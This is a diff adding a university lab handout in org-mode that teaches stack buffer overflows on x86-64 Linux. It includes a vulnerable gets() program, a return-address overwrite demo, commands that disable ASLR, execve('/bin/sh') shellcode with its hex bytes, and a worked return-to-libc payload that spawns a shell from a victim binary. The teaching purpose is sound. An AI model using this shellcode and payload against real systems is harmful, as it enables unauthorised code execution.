@@ -1,0 +1,266 @@
+#+STARTUP: showall
+#+STARTUP: lognotestate
+#+TAGS:
+#+SEQ_TODO: TODO STARTED DONE DEFERRED CANCELLED | WAITING DELEGATED APPT
+#+DRAWERS: HIDDEN STATE
+#+TITLE: Lab 8: Stack overflow
+#+CATEGORY: todo
+
+* Introduction
+
+This week we are going to learn how programs exploit bad programming. In particular, how well-crafted input can subjugate to execute a something completely
+different than what it was originally intended to do.
+
+* Stack overflow
+
+As you probably well aware, C gives you total programming power. But with great power, comes great responsibility. One of the biggest problems with C is that
+many programmers do not check that the data structures that they allocate in the stack are not overflown.
+
+Compile and test the following simple program. Call it =smashing.c=
+
+#+BEGIN_SRC C
+#include <stdio.h>
+#include <string.h>
+
+void main()
+{
+  char buffer[10];
+  puts("Type a very long string:");
+  gets(buffer);
+  if (strlen(buffer) < 50) {
+    puts("I said long!!!!. Try again\n");
+  } else {
+    printf("Input: [%s]\n", buffer);
+  }
+}
+#+END_SRC
+
+Compile it (=gcc -o smashing smashing.c=)
+
+*Q1. What is the warning you receive when you compile it?*
+
+*Q2. What happens when you give it a long input?*
+
+
+** GCC Stack-Smashing Protector (SSP)
+
+gcc can help us defend against these types of buffer overflows. Newer versions of gcc have this protection enabled by default. Not in our lab machines. Instead
+we need to enable it at compile time:
+
+#+BEGIN_EXAMPLE
+gcc -fstack-protector -o smashing smashing.c
+#+END_EXAMPLE
+
+Run it again.
+
+*Q3 What is the difference now?*
+
+* Subjugating a program: returning where we want
+
+So far, this is obviously expected. But can we do anything interesting by overwriting the stack? Let us try. Call this program =subjugating.c=. Compile it and run it.
+
+#+BEGIN_SRC C
+#include <stdio.h>
+#include <stdlib.h>
+int i;
+
+void do_not_execute(void)
+{
+  printf("\nDo not execute!!!!!!!!!!!!!\n");
+  exit(1);
+}
+
+void function(void) {
+  long int *stackTop = 0;
+  stackTop = (long int*)&stackTop;
+  for (i=0;i<16;i++) {
+    printf("stack offset %d from stackTop: %x value %x\n",i, stackTop + i, *(stackTop+i));
+  }
+  *(stackTop + 4) = (long int)do_not_execute;
+  printf("return to %x\n\n", *(stackTop+8));
+}
+
+void main() {
+  int x;
+
+  x = 0;
+  printf("address of do_not_execute %x\n", do_not_execute);
+  printf("address of function %x\n", function);
+  printf("address of main %x\n", main);
+  function();
+  x = 1;
+  printf("value of %d\n",x);
+  printf("hello world\n");
+}
+#+END_SRC
+
+
+*Q4. Why does it execute =do_not_execute=?* Hint, you should know what a stack frame is (remember your assembly programming?). If not head here: http://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64/
+
+** Try Stack-Smashing Protector in this program
+
+Enable SSP for this program.
+
+*Q5. Why doesn't SSP work in this program?*
+
+** Address Space Layout Randomization (ASLR)
+
+Run the program several times. As you can see, the addresses of the stack change every time. This is a security measure. This way it is more difficult to know
+the addresses that we need to override (that is why I had to print the addresses of the stack to identify where to the return address was). Let us disable by running it:
+
+#+BEGIN_SRC bash
+setarch `arch` -R ./subjugating
+#+END_SRC
+
+As you can see, now the stack is always exactly in the same place. This is a counter-measure to stack overflows.
+
+* Smashing to Subjugate
+
+So we can make a program crash or execute code that is not intended to do what it should. But, can we mix both at the same time? Of course we can.
+But this time we need to be crafty. Let us do in increments. First, let us create the smallest C program that executes shell that we can.
+
+Now head to https://crypto.stanford.edu/~blynn/rop/ and do the first part of the exercise (all the way to /The Importance of Being Patched/). I'll simply
+add to his tutorial in areas that you will probably have trouble understanding.
+
+But be careful about the following:
+
+1. Change your prompt. This will make it easy to know if you are inside the shell executed by the program or not. In the terminal type
+#+BEGIN_SRC BASH
+PS1='TEST> '
+#+END_SRC
+2. when you execute the binary of shell.c type exit to exit it.
+3. There is a typo in the command that generates the file =shellcode=.
+#+BEGIN_SRC bash
+xxd -s0x4bf -l32 -p a.out shellcode
+#+END_SRC
+it should be (notice the redirection). Make sure you use the right address
+#+BEGIN_SRC bash
+xxd -s0x4bf -l32 -p a.out > shellcode
+#+END_SRC
+** system  call
+
+In Linux =system= is a system call of the kernel. It is very simple. It is called using =syscall= with a value of 0x3b in the =rax= register, a pointer to
+the command to execute in the =rdi= register; =rsi= points to the list of arguments, and =rdx= to the environment variables. In this case the latter two are
+NULL.
+
+** The assembly
+
+This is a very well crafted piece of code. The challenge of the attack is to get the address of the command "/bin/sh" in the =rdi= register. But we have no clue
+where this code is going to end, so the easiest is to get the address of the string into the stack and then pop it into the register. How do we do it? if we
+call a function the stack automatically loads  the address immediately after the function. Let me do a play-by-play:
+
+1. We jump to "there"
+2. We call here (return to the top), this pushes the address of "/bin/sh" into the stack.
+3. Now we pop the address of "/bin/sh" into =rdi=, clear =rax= and =rsi=, and do the syscall.
+4. We do the syscall, which executes the command "/bin/sh" (the shell)
+
+#+BEGIN_SRC C
+int main() {
+  asm("\
+needle0: jmp there\n\
+here:    pop %rdi\n\
+         xor %rax, %rax\n\
+         movb $0x3b, %al\n\
+         xor %rsi, %rsi\n\
+         xor %rdx, %rdx\n\
+         syscall\n\
+there:   call here\n\
+.string \"/bin/sh\"\n\
+needle1: .octa 0xdeadbeef\n\
+  ");
+}
+#+END_SRC
+
+** Extracting the binary
+
+The command extracts the given bytes from your binary. Make sure you use the correct offset (in my case it was 0x495). It outputs the values in hexadecimal so
+we can easily read it.
+
+#+BEGIN_SRC BASH
+xxd -s0x495 -l32 -p a.out > shellcode
+#+END_SRC
+
+Make sure your =shellcode= matches:
+
+#+BEGIN_SRC BASH
+cat shellcode
+eb0e5f4831c0b03b4831f64831d20f05e8edffffff2f62696e2f736800ef
+bead
+#+END_SRC
+
+
+* Executable space protection (NX)
+
+As you learned in the tutorial above, code in the stack cannot be executed. This is a great countermeasure against stack overflows. Go back to the tutorial and do the section /Executable space perversion/
+
+*Q6. What is the behaviour of the program when you enable NX?*
+
+* If you have time...
+
+Do the section /The Importance of Being Patched/. It will show you that it is possible to know the address of the stack we need to attack by using =ps=
+
+* If your have more time... or want to keep playing...
+
+The rest of the tutorial is fascinating, to say the least.
+
+But we need to fix the tutorial so it works on our version of linux:
+
+1. First, in order to get his attack to work in our lab computers you need to change the source
+   code of =victim.c=. You need to change the size of the buffer from 64 to 128 bytes.
+2. The location of the library is =/lib64/libc.so.6=
+3. The addresses of =<system>= and =<exit>= that are extracted  using =nm= are absolute (it means we don't need to add the base)
+#+BEGIN_SRC bash
+nm -D /lib64/libc.so.6 | grep '\<exit\>'   | cut -f1 -d' '
+nm -D /lib64/libc.so.6 | grep '\<system\>' | cut -f1 -d' '
+#+END_SRC
+4. You need to change the payload string to the =%0130d= to =%0256d= to compensate for the bytes we have added.
+
+My values are:
+
+| base             | 0x000000392ba00000 |
+| gadget           |            0x20338 |
+| system           | 0x000000392ba3e900 |
+| exit             | 0x000000392ba35a50 |
+| address of array |     0x7fffffffddd0 |
+
+5. There is an error in his execution of the attack. He does not include any input to the command. Try the command below instead (remember to calculate your own
+   values for base, gadget, system, and address of array).
+
+#+BEGIN_SRC bash
+( (
+echo -n /bin/sh | xxd -p
+printf %0258d 0;
+printf %016x $((0x000000392ba00000+0x20338)) | tac -rs..
+printf %016x 0x7fffffffddd0 | tac -rs..
+printf %016x 0x000000392ba3e900 | tac -rs..
+echo
+) |  xxd -r -p; echo ; echo ls -lia ) | setarch `arch` -R ./victim
+#+END_SRC
+
+In a nutshell, this is the attack:
+
+The goal is to replace the stack with the following data:
+
+|----------------------------+--------------------------------------------------|
+| address of function system |                                                  |
+| address of /bin/sh         |                                                  |
+| address of gadget          | this was the return address of the original call |
+|                            |                                                  |
+|----------------------------+--------------------------------------------------|
+
+Let me explain the /gadget/. This is the code that is needed to execute (=pop rdi= then =retq=). These two instructions are simply two bytes 0x5f followed by
+0xc3. Ben (the author of the page) shows us that all we need is to find those two bytes /somewhere/ (anywhere) in the executable section of the library of libc.
+
+So here is the play by play:
+
+1. Insert the payload into the stack, replace the return address of the function with the address of the gadget
+2. Execute the gadget. The gadget pops the top of the stack (containing the address of /bin/sh into the register =rdi=
+3. Executes the return =retq=. The return  address is the address of the =system= function. Control is transferred to it.
+4. =system= behaves as expected. Executes =/bin/sh= (the shell)
+5. At the end of =system= control is transferred to its return address (at the top of the stack,
+6. The return value is invalid, so the program crashes with a segmentation fault. It is easy to fix it. Just add to the attack the address of =exit= and append
+   that to the string that goes into the stack. I'll leave that as an exercise to the reader.
+
+Happy coding
+
+--dmg
